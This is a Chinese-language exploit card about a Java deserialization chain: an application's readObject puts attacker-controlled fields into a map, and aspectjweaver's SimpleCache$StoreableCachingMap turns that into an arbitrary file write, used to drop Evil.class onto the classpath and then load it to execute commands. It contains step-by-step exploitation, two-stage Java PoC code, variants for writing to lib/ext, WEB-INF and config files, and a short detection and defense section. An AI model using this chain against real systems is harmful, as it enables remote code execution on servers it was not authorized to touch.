---
id: web-java-deserialization-app-readobject-controlled-put-aspectj-file-write
title: 应用自带 readObject 把字段喂给 HashMap.put：借 aspectjweaver StoreableCachingMap 把可控 put 变成任意路径文件写，落 class 后再反序列化同名校触发类加载执行
type: scenario
domain: web
path: web/java/deserialization
technique: app-readobject-controlled-put-aspectj-storeablecachingmap-file-write
aliases:
- 可控 put 任意文件写
- SimpleCache$StoreableCachingMap
- aspectjweaver 写文件
- UserBean readObject 利用
- 反序列化写 class 再触发
tags:
- java
- deserialization
- aspectj
- storeablecachingmap
- arbitrary-file-write
- gadget
- readobject
- classpath
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-T2-2
  verified_at: '2026-11-07T23:45:15+08:00'
  notes: 已对照 16537 原文与 img/01-02 核对：UserBean.readObject 的 GetField + HashMap a = gf.get(obj) + a.put(name, Base64.decode(age)) 与原文一致；SimpleCache$StoreableCachingMap 构造器 newInstance(./target/classes, 12) 写 Evil.class、第二步 writeObject(new Evil()) 从刚写入 class 加载执行，与原文 exp1/exp2 与图01/02 一致（本地弹出计算器）。边界与原文一致：远程为 jar 部署、无 target/classes 故未打通，卡片已明确标注 confidence medium 且把价值限定为写文件原语+二次加载这半链；不按未打通删除，因为最终危害（类加载执行）在本地已实测证明，落地路径属环境约束。未验证点：未复跑本地 exp、未验证远程是否存在其它可写 classpath 位置。未 set-versions（原文无受影响版本区间，aspectjweaver 1.9.5 仅为环境依赖）。未执行原文 payload。
---

## 一句话结论

当目标应用自带一个 `readObject`：从流里读出 `HashMap`、`name`、`age` 后执行 `map.put(name, <decoded bytes>)`，这个"应用自己的反序列化逻辑"就把 `name`/bytes 变成了完全可控的 map key 与 value；只要把该 `HashMap` 换成 `aspectjweaver` 的 `SimpleCache$StoreableCachingMap`（其 `put` 即 `new FileOutputStream(folder + "/" + key).write(bytes)`），就能在不依赖任何 CC 链的情况下把任意字节写到任意路径；把 `Evil.class` 写进 classpath 后再提交一个引用该类的序列化对象，`Class.forName/readObject` 加载同名类即执行其 `readObject`。

## 原理

- **应用 readObject 是"合法的可控 put"**：很多业务自定义序列化会写类似 `ObjectInputStream.GetField gf = ois.readFields(); HashMap a = (HashMap) gf.get("obj", null); a.put((String) gf.get("name", null), Base64.getDecoder().decode((String) gf.get("age", null)));`。这里的 `map` 对象类型由流决定，`put` 的 key/value 也由流决定，等价于给攻击者一个"任意 Map.put(key, bytes)"的原语。
- **StoreableCachingMap 把 put 变成写文件**：`org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap` 是 aspectjweaver 为缓存织入结果实现的 `Map` 包装：`put(k, v)` → `writeToPath(k, v)` → `new FileOutputStream(new File(folder, k)).write(v)`。`folder` 是构造参数，`k` 不做路径规范化，`../` 可穿越。
- **为什么能写到 classpath**：把 `StoreableCachingMap("./target/classes", 12)` 交给应用的 `obj` 字段，`name` 设为 `Evil.class`、`age` 设为该 class 的 Base64，`put` 就直接生成 `./target/classes/Evil.class`。Spring Boot fat jar 与开发环境里 `classes` 目录可写；本地复现即用此路径。
- **写文件 → 代码执行的第二步**：写盘后单独提交一个 `new Evil()` 的序列化字节。反序列化该对象时 JVM 需要解析 `Evil` 类名，`ObjectInputStream.resolveClass` 会经 `Class.forName` 加载 —— 此时从刚刚写入的 class 里取到攻击者版本，其 `readObject`（或静态块/构造器）被执行。原文用 `Runtime.getRuntime().exec("calc")` 验证弹计算器。
- **为什么不需要额外 gadget**：整条链只用了"应用自带 readObject"+"aspectjweaver 的 Map 实现"两个已存在于 classpath 的组件；与 CC/Spring 链无关，因此在只屏蔽常见 gadget 类、却把 aspectjweaver 留在依赖里的环境仍然成立。
- **置信度说明**：本地（有 `target/classes`）完整打通并弹出计算器；远程未打通，因为目标以 jar 形式部署、没有可写的 `classes` 目录（原文作者自述）。因此本卡的价值是"写文件原语 + 二次加载"这一半链在本地已证明，落地路径需按目标判断，故标 confidence: medium。

## 触发条件

- 反序列化入口可达（`ObjectInputStream.readObject`、JDBC 反序列化、任意 `readObject` 触发点），且攻击者能提交任意序列化字节。
- 目标 classpath 有 `aspectjweaver`（`SimpleCache$StoreableCachingMap` 未被打补丁移除且构造器可反射访问）。
- 应用存在把流内字段直接 `put` 进 Map 的 `readObject`，且该 `readObject` 不校验 map 的具体实现类型。
- 存在可写的 classpath 目录或可写并被再次加载的位置（开发态 `target/classes`、解包部署的 `WEB-INF/classes`、可写的 jar 目录）。

## 利用步骤

1. 审计入口类：找 `readObject` 里出现 `GetField` + `HashMap` + `put` 的写法，确认 `map` 字段没有白名单校验（不限制实现类）。
2. 反射取 `SimpleCache$StoreableCachingMap` 的构造器 `(String folder, int size)`，`setAccessible(true)`，以目标可写目录（如 `./target/classes`）实例化。
3. 构造应用 bean：`obj` = 该 StoreableCachingMap 实例，`name` = 待写文件名（可用 `../` 穿越），`age` = 目标文件的 Base64 字节。
4. 生成 payload 文件（`ObjectOutputStream.writeObject(bean)`），把它作为恶意 JDBC 服务端/反序列化入口的返回值提交，触发写盘。
5. 提交第二步 payload：`writeObject(new Evil())`，让 JVM 解析 `Evil` 类名时从刚写入的 class 加载，执行其 `readObject`/静态初始化。
6. 若目标无可写 classpath，改为写到其他"会被加载"的位置（JRE `lib/ext`、`WEB-INF/lib` 下的新 jar、`META-INF/services` 的 SPI 文件），或用该写入原语覆盖配置/脚本后触发。

## PoC

```java
// 第一步：写 class 到可写 classpath
Constructor<?> c = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap")
        .getDeclaredConstructors()[0];
c.setAccessible(true);
Object store = c.newInstance("./target/classes", 12);   // folder 可换成 ../.. 指向可写目录

UserBean bean = new UserBean();
bean.setObj(store);                                     // 应用的 readObject 会对此对象调用 put
bean.setName("Evil.class");                             // key → 落盘文件名
bean.setAge(Base64.getEncoder().encodeToString(
        Files.readAllBytes(Paths.get("Evil.class"))));   // value → 文件内容
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("payload"));
oos.writeObject(bean);
```

```java
// 第二步：引用刚写入的类，触发加载与执行
ObjectOutputStream oos2 = new ObjectOutputStream(new FileOutputStream("payload2"));
oos2.writeObject(new Evil());   // Evil.readObject / static {} 里放 Runtime.getRuntime().exec(...)
```

```java
// 应用侧被利用的 readObject 形态（审计特征）
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    GetField gf = ois.readFields();
    HashMap<String, byte[]> a = (HashMap) gf.get("obj", (Object) null);
    String name = (String) gf.get("name", (Object) null);
    String age  = (String) gf.get("age",  (Object) null);
    if (a != null) a.put(name, Base64.getDecoder().decode(age));   // ← 可控 put
}
```

## 变体与关联

- 变体：`StoreableCachingMap` 可换成其他"`put` 即写文件"的 Map 实现（缓存实现、`Properties` 落盘包装等）；也可换成 `Files.write`/`FileOutputStream` 型 sink 的 gadget。
- 变体：写盘目标从 classpath 改为 `WEB-INF/web.xml`、`logback.xml`、`application.properties`、`META-INF/services/*`，用配置/SPI 触发加载，避免依赖 `classes` 目录可写。
- 关联：[[web-java-deser-fury-priorityqueue-aspectj-jre-jar-write-rce]]（同一 `StoreableCachingMap` sink，但触发方式是 `PriorityQueue + TransformingComparator` 反序列化链，落地目标是 JRE `lib/ext` jar）、[[web-java-deserialization-sqlite-jdbc-table-name-select-injection-load-extension-rce]]（本篇另一条"落地 so 后加载"的路径）。
- 边界：`readObject` 对 `obj` 字段做了实现类白名单（只接受特定 Map）、classpath 无 aspectjweaver、无可写 classpath 且无可加载目录、`StoreableCachingMap` 在较新 aspectjweaver 中被移除时，链不成立。

## 检测与防御

- 修复：`readObject` 内不要信任流里给出的实现类型，`obj` 字段改为从固定白名单里反序列化或改成纯值对象；对 Map 的具体类型做 `instanceof` 校验。
- 依赖治理：移除不必要的 `aspectjweaver`；若必须保留，用 JEP 290 过滤器禁止 `SimpleCache$StoreableCachingMap` 与 `org.aspectj.weaver.*` 出现在流中。
- 运行权限：应用进程不可写自身 classpath、`WEB-INF`、配置目录；容器根文件系统只读，开发态 `classes` 目录不应在生产出现。
- 检测：反序列化流中出现 `SimpleCache$StoreableCachingMap`、`aspectj.weaver.tools.cache`；classpath/配置目录出现新增或哈希变化的 `.class`/`.xml`/`.jar` 且时间与反序列化请求吻合；Java 进程在写完文件后立即加载该目录下的新类。
